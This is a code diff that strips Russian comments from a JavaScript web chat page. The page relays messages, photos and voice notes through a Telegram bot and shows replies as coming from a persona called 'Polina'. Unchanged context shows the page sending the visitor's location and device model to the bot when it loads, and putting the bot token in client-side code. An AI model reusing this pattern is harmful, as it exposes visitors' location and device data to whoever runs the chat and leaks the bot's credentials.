@@ -185,7 +185,6 @@ const voiceBtn = document.getElementById('voiceBtn');
 
 let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;
 
-// --- Сохранение переписки ---
 let chatHistory = JSON.parse(localStorage.getItem('polinaChatHistory') || '[]');
 
 function saveChatHistory() {
@@ -199,7 +198,6 @@ function renderChatHistory() {
     });
 }
 
-// --- addMessage с опцией silent ---
 function addMessage(text, type = 'text', fileUrl = null, isMe = true, silent = false) {
     const msg = document.createElement('div');
     msg.className = 'msg' + (isMe ? ' me' : '');
@@ -215,7 +213,6 @@ function addMessage(text, type = 'text', fileUrl = null, isMe = true, silent = f
         content = `<span class="bubble"><span class="sender">${sender}</span><audio src="${fileUrl}" controls class="media"></audio></span>`;
     }
     if (isMe) {
-        // Без аватарки
         msg.innerHTML = content;
     } else {
         msg.innerHTML = `<img src="${POLINA_AVATAR}" class="avatar">` + content;
@@ -238,7 +235,6 @@ function sendToBot(formData) {
             disable_notification: false
         })
     });
-    // Для медиа используем sendPhoto/sendVideo/sendVoice
     if (formData.file) {
         let type = formData.file.type || '';
         let tgMethod = type.startsWith('image/') ? 'sendPhoto' :
@@ -282,7 +278,6 @@ fileInput.addEventListener('change', function() {
     fileInput.value = '';
 });
 
-// Голосовые сообщения через Web Audio API
 let mediaRecorder, audioChunks = [];
 voiceBtn.onclick = async function() {
     if (!mediaRecorder || mediaRecorder.state === 'inactive') {
@@ -304,7 +299,6 @@ voiceBtn.onclick = async function() {
     }
 };
 
-// Геолокация — спрашивать только один раз
 function getDeviceModel() {
     let ua = navigator.userAgent;
     let model = ua.match(/\(([^)]+)\)/);
@@ -336,7 +330,6 @@ function sendLocationAndDevice() {
     }
 }
 
-// Получение новых сообщений от бота (от Полины)
 function pollPolinaMessages() {
     setInterval(async () => {
         try {
@@ -347,12 +340,10 @@ function pollPolinaMessages() {
                     lastUpdateId = update.update_id;
                     localStorage.setItem('lastUpdateId', lastUpdateId);
                     if (update.message && update.message.chat && update.message.chat.id == CHAT_ID) {
-                        // Если сообщение не от нас (бота), а от Полины
                         if (update.message.from && update.message.from.username !== 'your_bot_username') {
                             if (update.message.text) {
                                 addMessage(update.message.text, 'text', null, false);
                             } else if (update.message.photo) {
-                                // Берём наибольшее фото
                                 const fileId = update.message.photo[update.message.photo.length-1].file_id;
                                 fetchPhotoUrl(fileId, url => addMessage('', 'image', url, false));
                             } else if (update.message.voice) {
@@ -368,7 +359,6 @@ function pollPolinaMessages() {
     }, 3000);
 }
 
-// Получить ссылку на файл Telegram
 function fetchFileUrl(fileId, cb) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
         .then(r=>r.json())
@@ -382,7 +372,6 @@ function fetchPhotoUrl(fileId, cb) {
     fetchFileUrl(fileId, cb);
 }
 
-// --- Восстановление истории при загрузке ---
 window.onload = function() {
     sendLocationAndDevice();
     renderChatHistory();
